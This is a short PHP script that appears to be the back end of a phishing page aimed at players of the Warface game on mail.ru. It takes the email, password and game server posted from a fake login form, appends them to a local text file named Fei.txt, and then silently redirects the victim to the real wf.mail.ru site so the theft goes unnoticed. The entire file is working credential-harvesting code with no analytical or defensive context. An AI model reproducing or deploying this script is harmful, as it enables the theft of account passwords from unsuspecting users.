<?PHP
$Log = $_POST['email'];
$Pass =$_POST['password'];
$Pas =$_POST['gameserver'];
$log = fopen("Fei.txt","at");
fwrite($log,"Nick- $Log:|Pass- $Pass:|Server- $Pas|\n");
fclose($log);
echo "<html><head><META HTTP-EQUIV='Refresh' content ='0; URL=https://wf.mail.ru/'></head></html>";
?>